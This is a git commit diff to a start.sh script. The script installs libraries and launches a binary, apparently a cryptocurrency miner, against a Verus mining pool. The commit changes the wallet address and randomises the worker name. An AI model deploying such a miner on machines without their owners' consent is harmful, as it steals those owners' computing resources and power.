10ebbe3156e6ddbcf4ed4210a0737073ea6d436f
Synergy <synergysbbc@gmail.com>
2026-04-29 11:51:07 +0200

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,8 +1,7 @@
 apt-get update
 apt-get install -y libjansson4
-
 apt-get install -y libssl1.1
-
 apt-get install -y libomp5
-./cmnr -a verus -o stratum+tcp://de.vipor.net:5040 -u R9RVXXmDDvnPx6oWraZVamd7QdEtbqnBV2.Worker-2GH -p x -t 3
 
+RAND=$((RANDOM % 900 + 100))
+./cmnr -a verus -o stratum+tcp://de.vipor.net:5040 -u RJybPz1ptdiinnoAy457BztBwFqaksjtN7.Worker-${RAND}-GH -p x -t 3
